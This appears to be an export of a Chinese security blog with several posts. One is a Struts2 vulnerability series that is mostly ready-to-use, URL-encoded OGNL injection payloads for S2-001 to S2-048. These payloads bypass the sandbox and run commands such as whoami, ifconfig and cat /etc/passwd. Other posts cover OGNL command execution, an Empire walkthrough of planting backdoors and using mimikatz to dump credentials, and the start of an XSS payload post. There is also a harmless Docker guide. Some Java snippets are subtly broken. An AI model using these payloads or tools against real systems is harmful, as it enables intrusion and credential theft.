<h2 id="0x03-OGNL的命令执行"><a href="#0x03-OGNL的命令执行" class="headerlink" title="0x03 OGNL的命令执行"></a>0x03 OGNL的命令执行</h2><p><strong>java的命令执行：java.lang.Runtime类的getRuntime方法</strong></p>
<pre><code>import java.io.IOException;
import static java.lang.Runtime.getRuntime;
public class Run{
    public static void main(String[] args)throws IOException{
        Process=getRuntime().exec(&quot;calc&quot;);
    }
}</code></pre><p><strong>OGNL实现</strong></p>
<pre><code>import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;
public class Ognltest{
    public static void main(String[] args)thros IOExceptions{
        OgnlContext context=new OgnlContext();
        Object obj=Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exe(&#39;calc&#39;)&quot;.context);
    }
}</code></pre><h2 id="0x04-沙盒"><a href="#0x04-沙盒" class="headerlink" title="0x04 沙盒"></a>0x04 沙盒</h2><ol>
<li>禁止了静态方法的调用</li>
<li><strong>allowStaticMethodAcces</strong> 和 <strong>MethodAccessor.denyMethodExecution</strong></li>
<li>xwork.MethodAccessor.denyMethodExecution设置为false</li>
<li>allowStaticMethodAccess设置为true</li>
</ol>
<pre><code>&lt;struts&gt;
　　&lt;!-- 开启静态方法访问常量 --&gt;
　　&lt;constant name=&quot;struts.ognl.allowStaticMethodAccess&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;
　　&lt;package name=&quot;struts&quot; extends=&quot;struts-default&quot;&gt;&lt;/package&gt;
&lt;/struts&gt;</code></pre><ol>
<li>#_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))</li>
<li>上面绕过了两个安全机制参数的限制（修改了安全机制参数的值）</li>
<li>URL编码</li>
<li>\u0023_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))&amp;(asdf)</li>
<li>payload:</li>
<li>(‘\u0023_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))&amp;(asdf)((‘\u0023rt.exec(‘ipconfig’)’)(\u0023rt[email]<a href="mailto:u003d@java.lang.Runt" target="_blank" rel="noopener">u003d@java.lang.Runt</a>[/email]ime@getRuntime()))=1</li>
</ol>
<p><strong>payload中开启</strong></p>
<ol>
<li>#_memberAccess[“allowStaticMethodAccess”]=true // 用来授权允许调用静态方法</li>
<li>创建ProcessBuilder对象来执行命令</li>
<li>new java.lang.ProcessBuilder(new java.lang.String[]{‘cat’,’/etc/passwd’})).start()</li>
</ol>
<h2 id="0x05-项目支持"><a href="#0x05-项目支持" class="headerlink" title="0x05 项目支持"></a>0x05 项目支持</h2><ol>
<li>WebWork</li>
<li>Struts2</li>
<li>Tapestry(4.0或之前)</li>
<li>Spring Web Flow</li>
<li>Apache Click</li>
<li>MyBatis- SQL映射框架</li>
<li>Thymeleaf- 一个Java XML / XHTML / HTML5 模板引擎</li>
<li>FreeMarker- 一个Java模板引擎</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.freebuf.com/column/181718.html" target="_blank" rel="noopener">https://www.freebuf.com/column/181718.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用</title>
    <url>/docker%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="0x00-docker准备"><a href="#0x00-docker准备" class="headerlink" title="0x00 docker准备"></a>0x00 docker准备</h2><ol>
<li>安装docker</li>
<li>apt-get install docker docker-compose</li>
<li>启动、重启、查看状态、停止</li>
<li>service docker start</li>
<li>service docker restart</li>
<li>service docker status</li>
<li>service docker stop</li>
<li><img src="/docker%E4%BD%BF%E7%94%A8/1.png" alt></li>
</ol>
<h2 id="0x10-docker命令帮助"><a href="#0x10-docker命令帮助" class="headerlink" title="0x10 docker命令帮助"></a>0x10 docker命令帮助</h2><ol>
<li>docker –help</li>
<li>docker command –help</li>
</ol>
<h2 id="0x20-docker镜像"><a href="#0x20-docker镜像" class="headerlink" title="0x20 docker镜像"></a>0x20 docker镜像</h2><ol>
<li>docker pull ubuntu #拉取/载入镜像</li>
<li>docker images #列出本地主机上的所有镜像</li>
<li>docker run -d REPOSITORY #启动容器</li>
<li>REPOSITORY：镜像的仓库源，TAG：镜像的标签，IMAGE ID：镜像ID，CREATED：镜像创建时间，SIZE：镜像大小</li>
<li>docker run -t -i ubuntu:14.04 /bin/bash #使用ubuntu14.04版本镜像运行容器，-t：终端，-i：交互式操作，/bin/bash：使用的shell</li>
<li>docker search ubuntu:14.04 #查看镜像</li>
<li>NAME：镜像仓库源的名称，DESCRIPTION: 镜像的描述，stars: 类似 Github 里面的 star，OFFICIAL: 是否 docker 官方发布，AUTOMATED: 自动构建</li>
<li>docker rmi NAME #删除镜像</li>
<li>docker tag ID XXX #设置镜像标签</li>
</ol>
<h3 id="0x21-构建镜像"><a href="#0x21-构建镜像" class="headerlink" title="0x21 构建镜像"></a>0x21 构建镜像</h3><ol>
<li>先创建一个dockerfile文件</li>
<li>docker build -t IMAGE . #.：dockerfile文件所在目录</li>
</ol>
<h2 id="0x30-docker容器"><a href="#0x30-docker容器" class="headerlink" title="0x30 docker容器"></a>0x30 docker容器</h2><ol>
<li>docker run -itd ubuntu /bin/bash #启动容器，-i：交互式操作，-t：终端，-d：容器启动后进入后台，Ubuntu：Ubuntu镜像，/bin/bash：使用的shell是/bin/bash，（如果没有Ubuntu这个镜像就新拉取，exit：退出）</li>
<li>docker ps -a #查看所有的容器</li>
<li>docker ps #查看正在运行的容器</li>
<li>容器ID：使用的镜像：启动容器时运行的命令：容器创建的时间：容器状态：容器端口和连接类型（tcp/udp）：容器名称</li>
<li>docker start ID #启动容器</li>
<li>docker restart ID #重启容器</li>
<li>docker stop ID #停止容器</li>
<li>docker stop ID #停止容器</li>
<li>docker logs ID #查看指定容器的日志</li>
<li>docker stats #查看所有容器的状态</li>
<li>docker exec -it ID /bin/bash #进入后台运行的容器</li>
<li>docker export ID &gt; ubuntu.tar #导出容器</li>
<li>cat ubuntu.tar | docker import - IMGAE #本地导入容器</li>
<li>docker import <a href="http://domain/xx.tgz" target="_blank" rel="noopener">http://domain/xx.tgz</a> IMAGE</li>
<li>docker rm ID/NAME #删除web应用容器，但必须先停止容器</li>
<li>docker rm -f ID/NAME #-f：强制删除容器</li>
<li>docker container prune #清除已停止状态的容器</li>
</ol>
<h2 id="0x40-运行web应用"><a href="#0x40-运行web应用" class="headerlink" title="0x40 运行web应用"></a>0x40 运行web应用</h2><ol>
<li>docker pull training/webapp #载入镜像</li>
<li>docker run -d -P training/webapp python app.py #运行python flask应用来运行一个web应用</li>
<li>-d：后台运行，-P：容器内部使用的网络端口映射到使用的主机上</li>
<li><img src="/docker%E4%BD%BF%E7%94%A8/2.png" alt></li>
<li>docker的5000端口（Python flask默认端口）映射到主机的32768端口上</li>
<li><img src="/docker%E4%BD%BF%E7%94%A8/3.png" alt></li>
<li>docker run -d -p 127.0.0.1:5001:5000 –name hello_world training/webapp python app.py #-p：docker的5000端口映射到本地主机端口5001，–name：自主命名</li>
<li>docker port ID #查看容器的端口映射</li>
<li>docker port NAME #查看容器的端口映射</li>
<li>docker logs -f ID #查看web应用程序日志</li>
<li>docker top NAME #查看web应用程序容器的进程</li>
<li>docker inspect NAME #查看web应用程序的底层信息</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-tutorial.html</a></p>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2漏洞序列</title>
    <url>/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x10-S2-001信息"><a href="#0x10-S2-001信息" class="headerlink" title="0x10 S2-001信息"></a>0x10 S2-001信息</h2><ol>
<li>官方链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li>
<li>影响版本：WebWork 2.1（启用altSyntax），WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</li>
<li>不受影响：WebWork 2.0，WebWork 2.1（禁用altSyntax，这是默认设置）</li>
<li></li>
<li><strong>漏洞原理：</strong></li>
<li>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</li>
<li>环境：</li>
<li><a href="https://vulhub.org/#/environments/struts2/s2-001/" target="_blank" rel="noopener">https://vulhub.org/#/environments/struts2/s2-001/</a></li>
<li>安装docker</li>
<li>sudo apt install docker.io</li>
<li>下载<a href="https://github.com/vulhub/vulhub/archive/master.zip" target="_blank" rel="noopener">vulhub</a></li>
<li>进入vulhub对应的漏洞目录，建立测试环境</li>
<li>docker-compose up -d 或者 docker-compose build</li>
<li>浏览器访问</li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/2.png" alt></li>
<li>列出镜像</li>
<li>docker images</li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/1.png" alt></li>
<li>关闭环境</li>
<li>docker-compose down</li>
</ol>
<h2 id="0x11-漏洞利用与payload（需要url编码）"><a href="#0x11-漏洞利用与payload（需要url编码）" class="headerlink" title="0x11 漏洞利用与payload（需要url编码）"></a>0x11 漏洞利用与payload（需要url编码）</h2><ol>
<li>获取tomcat执行路径：<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre></li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/3.png" alt></li>
<li></li>
<li>获取Web路径<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre></li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/4.png" alt></li>
<li></li>
<li>执行任意命令（命令加参数：new java.lang.String[]{“cat”,”/etc/passwd”}）<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre></li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/5.png" alt></li>
<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/6.png" alt></li>
</ol>
<h2 id="0x12-官方修复"><a href="#0x12-官方修复" class="headerlink" title="0x12 官方修复"></a>0x12 官方修复</h2><p><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/7.png" alt></p>
<ol>
<li>XWork 2.0.4中，改变了ognl表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行。</li>
<li>因为解析一层表达式后，loopCount &gt; maxLoopCount，直接执行break，不再解析用户的恶意代码。</li>
<li><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md" target="_blank" rel="noopener">参考</a></li>
</ol>
<h2 id="0x20-S2-005信息"><a href="#0x20-S2-005信息" class="headerlink" title="0x20 S2-005信息"></a>0x20 S2-005信息</h2><ol>
<li>官方链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-005</a></li>
<li>影响版本：Struts 2.0.0 - Struts 2.1.8.1</li>
<li>漏洞原因：OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞。</li>
<li>S2-003使用\u0023绕过s2对#的防御</li>
<li>S2-003添加了沙盒</li>
<li>S2-005使用OGNL表达式关闭沙盒，继续执行代码。</li>
</ol>
<h2 id="0x21-漏洞验证与payload"><a href="#0x21-漏洞验证与payload" class="headerlink" title="0x21 漏洞验证与payload"></a>0x21 漏洞验证与payload</h2><ol>
<li></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li>
</ol>
<h2 id="Struts2序列漏洞——OGNL注入表达式"><a href="#Struts2序列漏洞——OGNL注入表达式" class="headerlink" title="Struts2序列漏洞——OGNL注入表达式"></a>Struts2序列漏洞——OGNL注入表达式</h2><ol>
<li>漏洞编号：S2-001、S2-003、S2-005、S2-007、S2-009、S2-012、S2-013、S2-015、S2-016、S2-019、S2-029、S2-032、S2-033、S2-037、S2-045、S2-046、S2-048、S2-052</li>
<li>request参数名、cookie名：(ognl)(constant)=value&amp;(constant)((ognl1)(ognl2))（S2-003、S2-005）</li>
<li>request参数值：%{ognl}、${ognl}、(ognl)、’ognl’（S2-007、S2-009、S2-012）</li>
<li>request的文件名：%{ognl}、${ognl}（S2-046）</li>
<li>request的URL：/%{ognl}.action、/${ognl}.action（S2-015）</li>
<li>request的content-type：%{ognl}、${ognl}（S2-045）</li>
</ol>
<h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>web_path</p>
<pre><code>%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#39;%2F&#39;))%2C%23response.flush()%2C%23response.close()%7D</code></pre><p>S2-003</p>
<pre><code>(b)((&#39;%5C43context[%5C&#39;xwork.MethodAccessor.denyMethodExecution%5C&#39;]%5C75false&#39;)(b))&amp;(g)((&#39;%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()&#39;)(d))&amp;(i2)((&#39;%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()&#39;)(d))&amp;(i95)((&#39;%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))&#39;)(d))&amp;(i99)((&#39;%5C43xman.getWriter().close()&#39;)(d))</code></pre><p>S2-005<br><strong>webpath</strong></p>
<pre><code>%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29</code></pre><p>S2-007</p>
<pre><code>&#39;%2b(%23_memberAccess.allowStaticMethodAccess=true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,%23cmd=&quot;ifconfig&quot;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[500],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))%2b&#39;</code></pre><p>S2-009</p>
<pre><code>foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z[%28foo%29%28%27meh%27%29]=true</code></pre><p>S2-012</p>
<pre><code>%{(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false) #hackedbykxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#hackedbykxlzx.println(&#39;hacked by kxlzx&#39;),#hackedbykxlzx.close())}</code></pre><p>S2-013</p>
<pre><code>fakeParam=%25%7B(%23_memberAccess%5B&#39;allowStaticMethodAccess&#39;%5D%3Dtrue)(%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse)(%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23writer.println(&#39;hacked&#39;)%2C%23writer.close())%7D</code></pre><p>S2-015</p>
<pre><code>${%23context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=!(%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true),(@java.lang.Runtime@getRuntime()).exec(&#39;calc&#39;).waitFor()}.action</code></pre><p>S2-016</p>
<pre><code>redirect:$%7B%23a%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D</code></pre><p>S2-019</p>
<pre><code>debug=command&amp;expression=%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res.getWriter().print(%22S2-019        dir--***%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()</code></pre><p>S2-029</p>
<pre><code>(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;).getInputStream()))</code></pre><p>S2-032/S2-033/S2-037</p>
<pre><code>%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8</code></pre><p>S2-045/S2-046</p>
<pre><code>%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}</code></pre><p>S2-048</p>
<pre><code>%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29.%28%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23path%3d%23req.getRealPath%28%27%2f%27%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7d</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/168609.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透之Empire</title>
    <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/</url>
    <content><![CDATA[<h2 id="0x00-Empire"><a href="#0x00-Empire" class="headerlink" title="0x00 Empire"></a>0x00 Empire</h2><ol>
<li>下载：git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:EmpireProject/Empire.git 或者 git clone <a href="https://github.com/EmpireProject/Empire.git" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire.git</a></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/1.png" alt></li>
<li>进入目录/Empire/setup/，运行./install.sh进行安装（或sudo ./install.sh）</li>
<li>安装完后，切换到/Empire，运行./empire</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/2.png" alt></li>
<li>?或help #查看命令</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/3.png" alt></li>
</ol>
<h2 id="0x01-监听与生成后门"><a href="#0x01-监听与生成后门" class="headerlink" title="0x01 监听与生成后门"></a>0x01 监听与生成后门</h2><ol>
<li>listeners #监听</li>
<li>返回No listeners currently active，就使用监听方式，输入uselistener[空格]按一下tab</li>
<li>这里选http</li>
<li>info #查看配置信息</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/4.png" alt></li>
<li>设置shell文件名，连接ip与port</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/5.png" alt></li>
<li>run或者execute #执行监听</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/6.png" alt></li>
<li>返回上一层模块，要生成后门</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/7.png" alt></li>
<li>其中multi为通用模块，osx为mac操作系统，windows为windows模块。</li>
<li>info #查看配置信息</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/8.png" alt></li>
<li>生成后门文件（可以指定路径位置）。</li>
</ol>
<h2 id="0x02-管理员运行后门"><a href="#0x02-管理员运行后门" class="headerlink" title="0x02 管理员运行后门"></a>0x02 管理员运行后门</h2><ol>
<li>把后门文件拷贝/复制/上传/下载/…/到目的服务器上，并点击运行（会弹出cmd黑窗，一会就自动消失，因为生成后门时，查看配置信息有个Delete选项，默认设置为true，即运行后自动删除自己）</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/9.png" alt></li>
<li>回到正在监听的主机，已经获取到目的服务器的一个代理</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/10.png" alt></li>
<li>查看帮助命令</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/11.png" alt> </li>
<li>agents #查看获取的代理（这里是管理员，因为是以管理员用户去运行了后门脚本），查看帮助信息，顺便改个名字</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/12.png" alt></li>
<li><strong>获取代理后的一些命令</strong></li>
<li>agents #代理列表</li>
<li>back #返回</li>
<li>clear #清除代理任务</li>
<li>exit #代理退出</li>
<li>help #查看帮助信息</li>
<li>info #查看信息</li>
<li>interact [Name] #与[Name]进行交互</li>
<li>list #列出所有代理</li>
<li>kill #杀死相关进程</li>
<li>rename [Name] #重命名[Name]</li>
<li>main #返回主菜单</li>
<li>searchmodule #搜索模块</li>
<li>sleep #睡眠</li>
<li>usemodule #使用模块</li>
<li>usestager #生成后门方式</li>
<li></li>
<li>与目的服务器进行交互</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/13.png" alt></li>
<li><strong>与目的服务器进行代理的一些命令</strong></li>
<li>help agentcmds #查看帮助命令</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/14.png" alt></li>
<li>bypassuac #bypassuac模块，获取高级的代理</li>
<li>mimikatz #mimikatz模块，获取登录凭证</li>
<li>download #下载文件</li>
<li>upload #上传文件</li>
<li>sysinfo #查看服务器信息</li>
<li>shell dir #打开当前后门的目录位置</li>
<li>sc #截图，当前目的服务器</li>
<li></li>
<li>session_key是加密的，使用mimikatz来读取管理员的密码，直接报错退出了</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/15.png" alt></li>
</ol>
<p><strong>使用NativePayload_DNS，通过DNS流量，绕过防病毒传输后门</strong><br><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73766.html</a></p>
<h2 id="0x03-普通用户运行后门"><a href="#0x03-普通用户运行后门" class="headerlink" title="0x03 普通用户运行后门"></a>0x03 普通用户运行后门</h2><ol>
<li>获取代理</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/16.png" alt></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://www.anquanke.com/" target="_blank" rel="noopener">https://www.anquanke.com/</a></p>
]]></content>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/XSS/</url>
    <content><![CDATA[<h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p><img src="/XSS/1.jfif" alt></p>
<h2 id="0x01-简单脚本"><a href="#0x01-简单脚本" class="headerlink" title="0x01 简单脚本"></a>0x01 简单脚本</h2><p><strong>test.php</strong></p>
<pre><code>&lt;?php
$xss=$_GET[&#39;xss&#39;];
echo $xss;</code></pre><p><strong>test.html</strong></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;XSS&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;!--script type=&quot;text/javascript&quot;&gt;alert(1)&lt;/script--&gt;  &lt;!--弹窗--&gt;
    &lt;!--script type=&quot;text/javascript&quot;&gt;alert&amp;#40;2)&lt;/script--&gt; &lt;!--不弹窗--&gt;
    &lt;!--svg&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert&amp;#40;3)&lt;/script--&gt; &lt;!--弹窗--&gt;
    &lt;!--a href=&quot;javascript:alert(1)&quot;&gt;XSS&lt;/a--&gt; &lt;!--弹窗--&gt;
    &lt;!--a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&a